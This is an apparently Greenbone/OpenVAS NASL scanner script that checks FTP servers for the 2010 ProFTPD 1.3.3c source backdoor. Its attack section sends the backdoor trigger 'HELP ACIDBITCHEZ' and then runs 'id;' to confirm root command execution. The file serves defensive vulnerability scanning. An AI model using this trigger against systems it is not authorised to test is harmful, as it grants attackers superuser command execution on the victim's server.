# SPDX-FileCopyrightText: 2010 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:proftpd:proftpd";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100933");
  script_version("2025-08-29T05:38:41+0000");
  script_tag(name:"last_modification", value:"2025-08-29 05:38:41 +0000 (Fri, 29 Aug 2025)");
  script_tag(name:"creation_date", value:"2010-12-02 19:42:22 +0100 (Thu, 02 Dec 2010)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_cve_id("CVE-2010-20103");
  script_name("ProFTPD Backdoor Unauthorized Access Vulnerability");
  script_category(ACT_ATTACK);
  script_family("Gain a shell remotely");
  script_copyright("Copyright (C) 2010 Greenbone AG");
  script_dependencies("secpod_proftpd_server_detect.nasl");
  script_require_ports("Services/ftp", 21);
  script_mandatory_keys("ProFTPD/Installed");

  script_xref(name:"URL", value:"https://web.archive.org/web/20110917012335/http://www.securityfocus.com/bid/45150");
  script_xref(name:"URL", value:"http://sourceforge.net/mailarchive/message.php?msg_name=alpine.DEB.2.00.1012011542220.12930%40familiar.castaglia.org");
  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/15662");
  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/16921");

  script_tag(name:"summary", value:"ProFTPD is prone to an unauthorized-access vulnerability due
  to a backdoor in certain versions of the application.");
  script_tag(name:"affected", value:"The issue affects the ProFTPD 1.3.3c package downloaded between
  November 28 and December 2, 2010.

  The MD5 sums of the unaffected ProFTPD 1.3.3c source packages are
  as follows:

  8571bd78874b557e98480ed48e2df1d2 proftpd-1.3.3c.tar.bz2
  4f2c554d6273b8145095837913ba9e5d proftpd-1.3.3c.tar.gz

  Files with MD5 sums other than those listed above should be
  considered affected.");
  script_tag(name:"solution", value:"The vendor released an advisory to address the issue. Please
  see the references for more information.");
  script_tag(name:"impact", value:"Exploiting this issue allows remote attackers to execute
  arbitrary system commands with superuser privileges.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("ftp_func.inc");
include("host_details.inc");

if( ! port = get_app_port( cpe:CPE ) )
  exit( 0 );

if( ! get_app_location( cpe:CPE, port:port, nofork:TRUE ) ) # nb: To have a reference to the Detection-VT
  exit( 0 );

soc = open_sock_tcp( port );
if( ! soc ) exit( 0 );

ftp_recv_line( socket:soc );

ex = string( "HELP ACIDBITCHEZ" );
r  = ftp_send_cmd( socket:soc, cmd:ex );

if( "502" >< r ) exit( 0 ); # 502 Unknown command 'ACIDBITCHEZ'

r1 = ftp_send_cmd( socket:soc, cmd:string( "id;" ) );

ftp_close( socket:soc );
if( ! r1 ) exit( 0 );

if( egrep( pattern:"uid=[0-9]+.*gid=[0-9]+", string:r1 ) ) {
  data = string("It was possible to execute the command 'id' on the remote host,\nwhich produces the following output:\n\n");
  data += r1;
  security_message( port:port, data:data );
  exit( 0 );
}

exit( 99 );
